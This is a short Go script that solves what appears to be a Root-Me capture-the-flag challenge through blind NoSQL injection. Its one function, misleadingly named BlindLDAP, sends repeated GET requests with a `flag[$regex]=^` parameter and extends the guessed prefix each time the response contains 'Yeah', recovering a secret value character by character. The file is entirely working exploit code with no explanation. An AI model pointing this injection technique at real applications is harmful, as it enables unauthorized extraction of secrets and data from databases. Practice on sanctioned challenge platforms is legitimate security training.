package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func BlindLDAP(b string, char []rune) {
	var url string
	url = b
	for _, j := range char {
		url = b + string(j)
		req, _ := http.NewRequest("GET", url, nil)
		res, _ := http.DefaultClient.Do(req)
		defer res.Body.Close()
		body, _ := ioutil.ReadAll(res.Body)
		resp := string(body)
		if strings.Contains(resp, "Yeah") {
			fmt.Println(url)
			url = b + string(j)
			BlindLDAP(url, char)

		}
	}
}

func main() {
	var char []rune
	for i := 32; i <= 126; i++ {
		if rune(i) != '*' && rune(i) != '+' && rune(i) != '.' && rune(i) != '?' && rune(i) != '^' && rune(i) != ' ' && rune(i) != '|' && rune(i) != '#' && rune(i) != '&' && rune(i) != '$' {
			char = append(char, rune(i))
		}
	}
	var url = "http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]=^"
	BlindLDAP(url, char)
}
